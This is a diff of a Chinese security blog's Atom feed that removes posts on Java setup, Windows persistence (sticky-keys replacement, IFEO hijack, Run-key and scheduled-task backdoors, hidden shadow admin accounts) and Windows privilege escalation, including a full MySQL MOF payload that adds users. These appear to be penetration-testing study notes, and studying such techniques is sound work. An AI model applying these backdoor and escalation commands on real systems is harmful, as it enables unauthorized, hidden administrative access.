@@ -14742,50 +15152,10 @@ exp下载链接：<a href="https://github.com/SecWiki/linux-kernel-exploits" tit
     <published>2023-03-28T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">java环境配置</title>
-    <id>https://min168.top/perm/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.html</id>
-    <link href="https://min168.top/perm/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
-    <summary type="html"><![CDATA[
-<h3>windows     Linux见： Linux centos7 java环境配置</h3>
-<p>JRE8安装目录为C:\Program Files\Java\jre1.8.0_221</p>
-<p>​​</p>
-<p>打开环境变量的步骤：</p>
-<p>点击开始，右键选中我的电脑，点击属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量。</p>
-<p>1、设置JAVA_HOME</p>
-<p>JAVA_HOME：C:\Program Files\Java\jre1.8.0_221（JRE安装路径）</p>
-<p>​​</p>
-<p>​​</p>]]></summary>
-    <content type="html"><![CDATA[
-<h3>windows     Linux见： Linux centos7 java环境配置</h3>
-<p>JRE8安装目录为C:\Program Files\Java\jre1.8.0_221</p>
-<p>​​</p>
-<p>打开环境变量的步骤：</p>
-<p>点击开始，右键选中我的电脑，点击属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量。</p>
-<p>1、设置JAVA_HOME</p>
-<p>JAVA_HOME：C:\Program Files\Java\jre1.8.0_221（JRE安装路径）</p>
-<p>​​</p>
-<p>​​</p>
-<p>2、设置CLASSPATH</p>
-<p>CLASSPATH：.;%java_home%\lib;%java_home%\lib\tools.jar（注意前面的.）</p>
-<p>​​</p>
-<p>3、设置Path</p>
-<p>Path: C:\Program Files\Java\jre1.8.0_221\bin</p>
-<p>​​</p>
-<p>我们可以验证一下</p>
-<p>在CMD窗口输入：java -version</p>
-<p>​​</p>
-<p>可以正常显示版本号，这样就可以正确使用JRE了</p>
-<p>‍</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2023-12-18T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">upload-labs</title>
-    <id>https://min168.top/perm/upload-labs.html</id>
-    <link href="https://min168.top/perm/upload-labs.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">upload-labs靶场通关指南</title>
+    <id>https://min168.top/perm/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/perm/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <h2>Pass-1</h2>
 <p>上传合法文件，文件写入一句话木马。</p>
@@ -14935,423 +15305,10 @@ AddType application/x-httpd-php .php .phtml .php5 php3</p>
     <published>2023-05-16T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">windows权限维持</title>
-    <id>https://min168.top/perm/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html</id>
-    <link href="https://min168.top/perm/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
-    <summary type="html"><![CDATA[<p>php 不死马权限维持、映像劫持技术、策 略组脚本维持、shift 后门、建立影子账 号、power shell 配置文件后门、Monitor 权限维持、利用安全描述符隐藏服务后门 进行权限维持、iis 后门、window 隐藏技 术、驱动级文件隐藏</p>
-<h2>shift后门(shift backdoor)</h2>
-<p>绕过安全控制措施获取对程序或系统访问权限的方法。后门是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接 大多数情况下，后门是一个运行在目标主机上的<span data-type="text" style="color: var(--b3-font-color8);">隐藏进程</span>，可能允许一个<span data-type="text" style="color: var(--b3-font-color8);">普通的、未授权</span>的用户控制计算机 所以攻击者经常使用后门来控制服务器。</p>]]></summary>
-    <content type="html"><![CDATA[<p>php 不死马权限维持、映像劫持技术、策 略组脚本维持、shift 后门、建立影子账 号、power shell 配置文件后门、Monitor 权限维持、利用安全描述符隐藏服务后门 进行权限维持、iis 后门、window 隐藏技 术、驱动级文件隐藏</p>
-<h2>shift后门(shift backdoor)</h2>
-<p>绕过安全控制措施获取对程序或系统访问权限的方法。后门是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接 大多数情况下，后门是一个运行在目标主机上的<span data-type="text" style="color: var(--b3-font-color8);">隐藏进程</span>，可能允许一个<span data-type="text" style="color: var(--b3-font-color8);">普通的、未授权</span>的用户控制计算机 所以攻击者经常使用后门来控制服务器。</p>
-<p>比较老的方式 在winodws中有一些辅助功能，能在用户未登录系统之前就通过组合键来启动 Windows的粘滞键 在Windows系统按5下shift后，Windows就运行了System32下的sethc.exe,启动粘滞键粘滞键的位置:C:\windows\system32\sethc.exe</p>
-<h3>shift后门原理</h3>
-<p>把 cmd.exe 这个程序更名为 sethc.exe，并且把原来的sethc.exe替换掉 之后在登录界面连续按下5次shift键后，系统会以system权限运行cmd.exe 那么此时的 cmd.exe 就具有了管理权限，之后只要利用cmd增加一个管理员用户就可以登录进去，实现隐藏后门</p>
-<h3>shift后门制作</h3>
-<p>用 cmd.exe 替换 windows\system32 目录下的粘滞键可执行文件sethc.exe</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">cd c:\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">windows\system32 </span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">move sethc.exe sethc.exe.bak </span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">copy cmd.exe sethc.exe</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<p>拒绝访问将将权限目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">takeown </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f c:\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">windows\system32\*.*   /a /r /d y</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">cacls  c:\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">windows\system32\*.*  /T /E /G administrators:F</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>重新替换</p>
-<p>​​</p>
-<p>锁定界面5次shift后</p>
-<p>​​</p>
-<p>将其添加用户到管理员用户组</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">net user xiao </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">123456</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">add </span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">&amp;&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> net localgroup administrators xiao </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">add</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>​​</p>
-<h3>shift后门防御</h3>
-<ul>
-<li>在远程登录服务器时，连续按5次 shift 键，判断服务器是否被入侵</li>
-<li>禁用该 sethc.exe 功能 或者在“控制面板”中关闭“连续按5次shift键时启用粘滞键选项</li>
-<li>使用权限约束 sethc.exe，使任何人都不能访问它</li>
-</ul>
-<h2>映像劫持 IFEO(lmage File Execution Options)</h2>
-<h3>映像劫持原理</h3>
-<p>在高版本的windows版本中<span data-type="text" style="color: var(--b3-font-color8);">替换的文件受到了系统的保护</span>，所以需要进行"映像劫持“ 可以理解为当打开a.exe程序实际打开的却是b.exe程序，那么a程序就是被b程序劫持了。是为一些在默认系统环境中运行时可能引发错误的 程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大，默认是只有管理员和 local system有权读写修改.</p>
-<h3>制作映像劫持</h3>
-<ol>
-<li>
-<p>粘滞键的启动程序在C盘的Windows/system32目录下为sethc.exe</p>
-</li>
-<li>
-<p>regdit</p>
-</li>
-<li>
-<p>HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Image File ExecutionOption  新建项 sethc.exe</p>
-<p>​​</p>
-</li>
-<li>
-<p>在新建的项中添加debugger键，键值设置为恶意程序的路径</p>
-<p>​​</p>
-</li>
-<li>
-<p>这里用cmd路径代替。cmd路径：C:\Windows\system32\cmd.exe</p>
-<p>​​</p>
-</li>
-<li>
-<p>锁定访问</p>
-<p>​​</p>
-</li>
-</ol>
-<p>​​</p>
-<h2>启动项、计划任务</h2>
-<h3>注册表自启动后门</h3>
-<p>通过修改注册表实现自动启动需要运行程序</p>
-<p>最常见的在指定键值添加一个新的键值类型为 REG SZ,数据项中添写需要运行程序的路径即可以启动</p>
-<ol>
-<li>
-<p>打开注册表路径：HKEY LOCAL MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</p>
-</li>
-<li>
-<p>添加一个键值类型为REG SZ</p>
-</li>
-<li>
-<p>在数据中填写需要运行程序的路径</p>
-<p>​</p>
-</li>
-<li>
-<p>开机自动弹出</p>
-<p>​​</p>
-</li>
-</ol>
-<h3>计划任务后门</h3>
-<p>计划任务在 Windows7 及之前版本的操作系统中使用 <span data-type="text" style="color: var(--b3-font-color8);">at </span>命令调用，从 Windows8 等高版本的操作系统中使 用 <span data-type="text" style="color: var(--b3-font-color8);">schtasks </span>命令调用</p>
-<p>at命令是只会打开一个后台进程，而schtasks命令是将定时的任务在前台执行</p>
-<h4>at命令的参数</h4>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">AT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">\computername] time [/INTERACTIVE] [ /EVERY:date[...]/NEXT:date....]] "command'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>schtasks命令的参数</h4>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">create </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn TaskName </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tr TaskRun </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sc schedule [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">mo modifier] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">d day] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">m monthl,month.] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i ldieTime] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">st StartTime] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sd StartDate] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ed EndDate] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">s computer [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">u [domain\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">juser /p password]] [/ru {[Domain\]User "System"} [/rp Password]] /?</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>计划任务后门制作</h4>
-<p>计划任务后门分为管理员权限和普通权限两种，管理员权限的后门可以设置更多的计划任务，例如重启后运行等</p>
-<p>创建计划后门的基本命令</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">create </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"任务名称"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tr cmd.exe </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sc minute </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">mo </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        #该命令表示每分钟执行一次cmd.exe</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">query </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"任务名称"</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">                                  #查看某计划任务:将“任务名称”替换为您要查看的任务的实际名称。</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">query                                             </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#查看所有计划任务：然后按Enter键。</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h2>影子账户</h2>
-<p>在注册表中打开 HKEY LOCAL MACHINE/SAM/SAM/Domains/Account/Users/选项，点击Names菜单 注意:如果进入SAM后无法再看到里面的子选项，需要给予administrators完全控制权限，并重新进入注册表</p>
-<ol>
-<li>
-<p>创建隐藏账户</p>
-<p>​​</p>
-</li>
-<li>
-<p>打开注册表  给权限 <span data-type="text" style="color: var(--b3-font-color8);"> 给完权限查询打开</span></p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">HEKY_LOCAL_MACHINE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">\</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">SAM\SAM\Domains\Account\User在SAM\SAM</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-</li>
-<li>
-<p>“Users”里包含的就是该帐户的权限的键值</p>
-<p>​​</p>
-</li>
-<li>
-<p>把Administrator的F键值的内容替换掉hack的F键值（这样hack也有管理员权限了）</p>
-<p>​​</p>
-</li>
-<li>
-<p>将隐藏用户的名字和权限注册表导出</p>
-<p>​​</p>
-</li>
-<li>
-<p>删除账户</p>
-<p>​​</p>
-</li>
-<li>
-<p>双击两个文件添加</p>
-<p>​​</p>
-</li>
-<li>
-<p>影子用户创建完成，net user和计算机管理中都看不见zxk$用户，只有注册表中可以看见，且具有管理员权限</p>
-<p>​​</p>
-</li>
-</ol>
-<p>‍</p>
-<p>‍</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2023-09-20T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">windows系统提权</title>
-    <id>https://min168.top/perm/windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html</id>
-    <link href="https://min168.top/perm/windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
-    <summary type="html"><![CDATA[<h4>windows提权分类</h4>
-<p>1.系统漏洞提权(Linux、Windows)内核提权<br>
-3.第三方软件/服务提权<br>
-2.数据库提权<br>
-4.系统配置错误提权</p>
-<h4>windows提权概述</h4>
-<p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br>
-windows:</p>
-<p>user--&gt;System<br>
-user--&gt;Administrator</p>]]></summary>
-    <content type="html"><![CDATA[<h4>windows提权分类</h4>
-<p>1.系统漏洞提权(Linux、Windows)内核提权<br>
-3.第三方软件/服务提权<br>
-2.数据库提权<br>
-4.系统配置错误提权</p>
-<h4>windows提权概述</h4>
-<p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br>
-windows:</p>
-<p>user--&gt;System<br>
-user--&gt;Administrator</p>
-<p>Linux:<br>
-user--&gt;Root</p>
-<h4>windows提权流程</h4>
-<p>获得目标机shll=&gt;查看补丁记录=&gt;寻找对应EXP=&gt;使用Exp提权</p>
-<h4>1.windows系统漏洞提权</h4>
-<ol>
-<li>
-<p>查看这台主机还有哪些漏洞没有修复</p>
-<p>方法一：在cmd中输入systeminfo查看补丁安装情况</p>
-<p>​​</p>
-<p>方法二：通过命令查询出哪些补丁没有安装</p>
-</li>
-<li>
-<p>查找补丁对应的漏洞号 使用在线查询工具</p>
-<p><a href="http://blog.neargle.com/win-powerup-exp-index/#" target="_blank" rel="noopener noreferrer">http://blog.neargle.com/win-powerup-exp-index/#</a></p>
-<p><a href="http://tools.sbbbb.cn/tiquan/" target="_blank" rel="noopener noreferrer">http://tools.sbbbb.cn/tiquan/</a></p>
-<p><a href="http://bypass.tidesec.com/exp/" target="_blank" rel="noopener noreferrer">http://bypass.tidesec.com/exp/</a></p>
-</li>
-<li>
-<p>查找对应提权exp</p>
-<p>可在搜索引擎查找</p>
-<p>github查找  <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener noreferrer">github.com/SecWiki/windows-kernel-exploits</a></p>
-<p>windows中提权exp的格式为</p>
-<p>​​</p>
-</li>
-<li>
-<p>配合msf进行提权</p>
-</li>
-</ol>
-<h4>2.windows 数据库提权</h4>
-<h5>mysql-mof提权步骤</h5>
-<ol>
-<li>
-<p>在可写目录中上传mof文件</p>
-<p>nullevt.mof   文件</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#pragma namespace("\\\\.\\root\\subscription")</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> __EventFilter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $EventFilter</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">EventNamespace</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Root</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Cimv2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "filtP2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Query</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Select * From __InstanceModificationEvent "</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"Where TargetInstance Isa </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Win32_LocalTime</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> "</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"And TargetInstance.Second = 5"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">QueryLanguage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "WQL"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ActiveScriptEventConsumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $Consumer</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "consPCSV2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ScriptingEngine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "JScript"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ScriptText</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"var WSH = new ActiveXObject(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WScript.Shell</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">)\nWSH.run(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.exe user zhang 123456 /add</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> __FilterToConsumerBinding</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Consumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $Consumer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $EventFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>把.mof脚本移动到指定的目录：c:/windows/system32/wbem/mof/目录下，该目录每5秒执行一次​</p>
-</li>
-<li>
-<p>执行 load file 及 into dumpfile 把文件导出到正确的位置</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> load_file('c:/phpstudy/www/nullevt.mof')into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'c:/windows/system32/wbem/mof/nullevt.mof'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>执行成功后，验证mof文件中的cmd命令是否执行</p>
-<p>​​</p>
-</li>
-<li>
-<p>同样的方法修改mof文件再重复上次的步骤，可以将用户添加到管理员组</p>
